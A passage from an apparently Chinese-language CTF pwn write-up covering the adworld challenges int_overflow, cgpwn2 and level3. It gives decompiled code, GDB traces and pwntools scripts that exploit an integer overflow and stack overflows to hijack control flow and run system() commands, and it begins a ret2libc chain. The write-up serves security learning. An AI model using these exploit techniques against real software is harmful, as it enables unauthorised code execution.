)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid Password&quot;</span>);</span><br><span class="line">    result = (<span class="type">char</span> *)fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(&amp;dest, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数首先声明了 <code>unsigned __int8 v3</code> ，8字节，最大值256。随后通过<code>strlen()</code>计算最大长度可达0x199的变量s的长度，将该变量长度复制给最大值为256的变量v3。这里存在整数溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">0xffffffff</span>;</span><br><span class="line">b = <span class="number">0x1</span>;</span><br><span class="line">c = a + b;</span><br><span class="line">c = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>c 的最大宽度是8位，a+b之后结果应该是 0x100000000 ，但是由于c只能存储低8位，于是高位产生了截断，导致c只保存了 0x00000000，即c&#x3D;0。</p>
<p>在接下来的if判断中，如果没有通过判断，即长度 <code>3&lt;v3&lt;8</code> 可以执行<code>strcpy()</code>，将函数自己带过来的参数复制到变量 <code>dest</code>中，而这个变量距离<code>ebp</code>有0x14字节的距离，我们可以通过此来使得栈溢出，首先填充到<code>$ebp</code>（0x14字节），然后越过<code>previous $ebp</code>（4字节），覆盖到返回地址。</p>
<p>现在有几个问题：</p>
<ol>
<li>如何经过if判断？</li>
<li>覆盖到返回地址需要填充多少字节？</li>
<li>让函数返回到哪里？</li>
</ol>
<p>对第一个问题，我们利用整数溢出，条件是3-8之间，那我们只需要256+3或256+8即可让其溢出后只保留低位的数字。如果我们只用3-8之间的参数数量去输入，那我们的payload不够写。</p>
<p>对第二个问题，其实上文已经说了需要填充 0x14+4。同时为了满足if判断，我们要用256+8(我们这里选择了较大的数)来减去填充的数据，以及返回地址的长度：256+8-0x14-4-8&#x3D;234个字节填充数据，来给到s足够的长度。</p>
<p>对第三个问题，我们可以找到题目的后门函数<code>what is this</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">what_is_this</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其函数起始地址为<code>0x804868B</code>，此即用作函数返回地址。</p>
<p>于是，payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">63884</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./int_overflow&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># backdoor func addr</span></span><br><span class="line">retaddr = <span class="number">0x804868B</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># padding 0x14 + 4($ebp) + 8(addr) + 232</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x14</span> + <span class="string">&quot;BBBB&quot;</span> + p32(retaddr) + <span class="string">&quot;b&quot;</span>*<span class="number">234</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your username:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your passwd:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><p>32位程序，查看保护</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>

<p>没有开启栈保护和地址随机化，开启了堆栈代码不可执行，我们要想办法利用题目自身的代码。</p>
<p>本地运行完知道基本功能后，打开IDA查看：定位到hello()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">hello</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+12h] [ebp-26h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+14h] [ebp-24h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;s;</span><br><span class="line">  v1 = <span class="number">30</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)&amp;s &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)&amp;s = <span class="number">0</span>;</span><br><span class="line">    v0 = (<span class="type">char</span> *)&amp;v6;</span><br><span class="line">    v1 = <span class="number">28</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)&amp;v0[v2] = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &lt; (v1 &amp; <span class="number">0xFFFFFFFC</span>) );</span><br><span class="line">  v3 = &amp;v0[v2];</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)v3 = <span class="number">0</span>;</span><br><span class="line">    v3 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; <span class="number">1</span> )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please tell me your name&quot;</span>);</span><br><span class="line">  fgets(name, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hello,you can leave some message here:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gets()明显存在溢出，先来判断一下需要溢出多少（<code>char s; // [esp+12h] [ebp-26h]</code>这里IDA判断出与ebp的偏移为0x26，但我们为了防止不出错，还是自己验证一下的好）。使用GDB在gets()下断点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">r</span><br><span class="line">Starting program: /home/brian/桌面/adworld/cgpwn2 </span><br><span class="line">please tell me your name</span><br><span class="line">admin</span><br><span class="line">hello,you can leave some message here:</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080485f7 in hello ()</span><br><span class="line">gdb-peda$ n</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd112 (&#x27;A&#x27; &lt;repeats 38 times&gt;, &quot;BBBB&quot;)</span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb45c0 --&gt; 0xfbad208b </span><br><span class="line">EDX: 0xf7fb589c --&gt; 0x0 </span><br><span class="line">ESI: 0x1c </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0xffffd138 (&quot;BBBB&quot;)</span><br><span class="line">ESP: 0xffffd100 --&gt; 0xffffd112 (&#x27;A&#x27; &lt;repeats 38 times&gt;, &quot;BBBB&quot;)</span><br><span class="line">EIP: 0x80485fc (&lt;hello+154&gt;:	nop)</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x80485f1 &lt;hello+143&gt;:	lea    eax,[ebp-0x26]</span><br><span class="line">   0x80485f4 &lt;hello+146&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x80485f7 &lt;hello+149&gt;:	call   0x80483f0 &lt;gets@plt&gt;</span><br><span class="line">=&gt; 0x80485fc &lt;hello+154&gt;:	nop</span><br><span class="line">   0x80485fd &lt;hello+155&gt;:	add    esp,0x30</span><br><span class="line">   0x8048600 &lt;hello+158&gt;:	pop    ebx</span><br><span class="line">   0x8048601 &lt;hello+159&gt;:	pop    esi</span><br><span class="line">   0x8048602 &lt;hello+160&gt;:	pop    ebp</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd100 --&gt; 0xffffd112 (&#x27;A&#x27; &lt;repeats 38 times&gt;, &quot;BBBB&quot;)</span><br><span class="line">0004| 0xffffd104 --&gt; 0x32 (&#x27;2&#x27;)</span><br><span class="line">0008| 0xffffd108 --&gt; 0xf7fb45c0 --&gt; 0xfbad208b </span><br><span class="line">0012| 0xffffd10c --&gt; 0x0 </span><br><span class="line">0016| 0xffffd110 --&gt; 0x41414000 (&#x27;&#x27;)</span><br><span class="line">0020| 0xffffd114 (&#x27;A&#x27; &lt;repeats 36 times&gt;, &quot;BBBB&quot;)</span><br><span class="line">0024| 0xffffd118 (&#x27;A&#x27; &lt;repeats 32 times&gt;, &quot;BBBB&quot;)</span><br><span class="line">0028| 0xffffd11c (&#x27;A&#x27; &lt;repeats 28 times&gt;, &quot;BBBB&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x080485fc in hello ()</span><br><span class="line">gdb-peda$ x/20wx $ebp-4 //从ebp-4开始查看20个内存单元的内容</span><br><span class="line">0xffffd134:	0x41414141	0x42424242	0x08048600	0xf7fb4ce0</span><br><span class="line">0xffffd144:	0x00000000	0x0804867b	0x00000000	0xf7fb4000</span><br><span class="line">0xffffd154:	0xf7fb4000	0x00000000	0xf7df4f21	0x00000001</span><br><span class="line">0xffffd164:	0xffffd1f4	0xffffd1fc	0xffffd184	0x00000001</span><br><span class="line">0xffffd174:	0x00000000	0xf7fb4000	0xf7fe571a	0xf7ffd000</span><br><span class="line">gdb-peda$ x/20wx $ebp</span><br><span class="line">0xffffd138:	0x42424242	0x08048600	0xf7fb4ce0	0x00000000</span><br><span class="line">0xffffd148:	0x0804867b	0x00000000	0xf7fb4000	0xf7fb4000</span><br><span class="line">0xffffd158:	0x00000000	0xf7df4f21	0x00000001	0xffffd1f4</span><br><span class="line">0xffffd168:	0xffffd1fc	0xffffd184	0x00000001	0x00000000</span><br><span class="line">0xffffd178:	0xf7fb4000	0xf7fe571a	0xf7ffd000	0x00000000</span><br></pre></td></tr></table></figure>

<p>可以看到，在我们输入38个A之后，剩余的4个B（’A’ &lt;repeats 38 times&gt;, “BBBB”）刚好覆盖完了ebp（EBP: 0xffffd138 (“BBBB”)）。</p>
<p>ok，那么38个A+4个B之后的4字节就是我们要覆盖的返回地址，那我们要让它返回到哪里？查看程序还发现了题目预留的后门函数pwn():</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwn</span><span class="params">()</span><span class="comment">// starts at 804854D</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo hehehe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然system函数的参数已经写好了，我们先让函数返回到这里试试能不能成功执行给定的参数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./cgpwn2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ebp-&gt; &#x27;A&#x27; &lt;repeats 38 times&gt;, &quot;BBBB&quot; </span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;please tell me your name\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">38</span> + <span class="string">&quot;BBBB&quot;</span> + p32(<span class="number">0x804854D</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;hello,you can leave some message here:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>我们从终端看到成功输出<code>hehehe</code>，接下来考虑如何让system执行<code>/bin/sh</code>等命令。</p>
<p>一般来说函数的调用方式都是<code>参数+返回地址+函数地址</code>按照这个顺序入栈随后带着传入的参数执行函数。</p>
<p><img src="/Users/brian/Desktop/typro/pictures/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E6%A0%88%E5%8F%98%E5%8C%96.png" alt="函数调用过程栈变化"></p>
<p>函数地址好说，这里的函数地址不再是我们上面代码中的<code>0x804854D</code>(这是pwn()的地址)，我们只需要system()。我们在pwn()中找到<code>call _system</code>汇编，点击<code>_system</code>即可看到system()的具体信息 <code>0x8048420</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048420 ; int system(const char *command)</span><br><span class="line">.plt:08048420 _system         proc near               ; CODE XREF: pwn+D↓p</span><br><span class="line">.plt:08048420</span><br><span class="line">.plt:08048420 command         = dword ptr  4</span><br><span class="line">.plt:08048420</span><br><span class="line">.plt:08048420                 jmp     ds:off_804A01C</span><br><span class="line">.plt:08048420 _system         endp</span><br></pre></td></tr></table></figure>

<p>返回地址也好说，我们目标只是让它执行，执行完去哪不重要，随便给4字节就行。</p>
<p>参数不好说，因为函数调用时我们说的参数不是字符串，实际上还是一个指向参数的地址。我们要到哪里找一个内容是我们控制的地址？fgets()函数！</p>
<p>在gets()上面我们可以输入通过fgets()输入内容，会被保存到变量 name 中。fgets()比gets()函数安全，因为它限制了输入长度，通常不会产生溢出。找到name的地址为<code>0x0804A080</code>，我们在第一步输入名字时输入想要执行的命令即可，那么payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">63884</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./cgpwn2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ebp-&gt; &#x27;A&#x27; &lt;repeats 38 times&gt;, &quot;BBBB&quot; </span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;please tell me your name\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = padding + system_addr + ret_addr + argu_addr</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">38</span> + <span class="string">&quot;BBBB&quot;</span> + p32(<span class="number">0x8048420</span>) + <span class="string">&quot;c&quot;</span>*<span class="number">4</span> + p32(<span class="number">0x804A080</span>) </span><br><span class="line">p.recvuntil(<span class="string">&quot;hello,you can leave some message here:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里在本地调试，我们成功执行了<code>whoami</code> 命令，接下来只需要修改命令即可。</p>
<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>这道题开始有那味了。</p>
<p>题目给的附件中给出了libc.so文件，附件为32位ELF文件，保护：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>

<p>没有栈溢出保护，没有地址随机化，堆栈代码不可执行，我们没办法注入shellcode来执行了。IDA打开附件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中vulnerable_function()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Read()</code>存在明显的栈溢出。由于目前我们没有找到可用的<code>system()</code>，所以目前溢出后的返回地址我们还不能确定。</p>
<p>题目中给了我们libc文件，是想让我们利用它，考察 <code>ret2libc</code>。</p>
<p>在动态链接的完成后，libc.so文件中的各个函数之间的间隔在编译完成后的 <code>ELF文件</code> 中仍保持不变。因此我们可以利用libc.so中的<code>system()</code>和<code>write()</code>，配合我们<code>ELF</code>的<code>write()</code>函数来获取链接完成之后<code>ELF文件</code>中<code>system()</code>函数的绝对地址：<code>system_abs_addr = write_abs_addr - (write_libc_addr - system_libc_addr)</code></p>
<p>在找到<code>system()</code>之后我们还需要参数<code>/bin/sh</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">brian@brian:~/桌面/adworld/level3$ ROPgadget --binary libc_32.so.6 --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0015902b : /bin/sh</span><br></pre></td></tr></table></figure>

<p>同样的计算方式可以利用间隔不变通过参数在<code>ELF文件</code>中的地址和<code>write()</code>的地址来算出参数最后在程序中的地址。</p>
<p><code>write_libc_addr</code> 和 <code>system_libc_addr</code> 我们可以通过IDA打开附件给的 libc.so 文件来查找其地址。</p>
<p><code>write_abs_addr</code> 应该去哪里找？这个地址也就是<code>ELF</code>文件中的地址，我们可以通过栈溢出，溢出到<code>write()</code>的<code>PLT</code>位置，调用该函数，然后构造参数，来将这个地址打印出来。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + write_plt_addr + vuln_func_addr + argus</span><br></pre></td></tr></table></figure>

<p>根据32位程序的函数调用顺序可知，<code>padding</code> 之后首先跟的是 <code>write_plt_addr</code> ，这个地址是 <code>write</code>函数在<code>.got</code>中的地址，溢出后控制函数回到这个地址</p>
<p>这里的 <code>argus</code>分别为 <code>1,write_got_addr,4</code> 代表将 <code>write_got_addr</code> 的地址以4个字节进行标准输出。在计算完需要的绝对地址后将函数再次返回到 <code>vuln_fun_addr</code> 方便再次利用栈溢出，调用<code>system()</code>。</p>
<p>栈溢出的偏移怎么算呢？除了手动之外今天学了新方法：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line"></span><br><span class="line">······</span><br><span class="line">gdb-peda$:</span><br><span class="line">Input:</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">······</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x6261616b <span class="keyword">in</span> ?? ()</span><br><span class="line"></span><br><span class="line">$ cyclic -l 0x6261616b </span><br><span class="line"><span class="comment"># padding 140</span></span><br></pre></td></tr></table></figure>

<p>通过输入类似于循环的长数据来判断溢出位置。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span 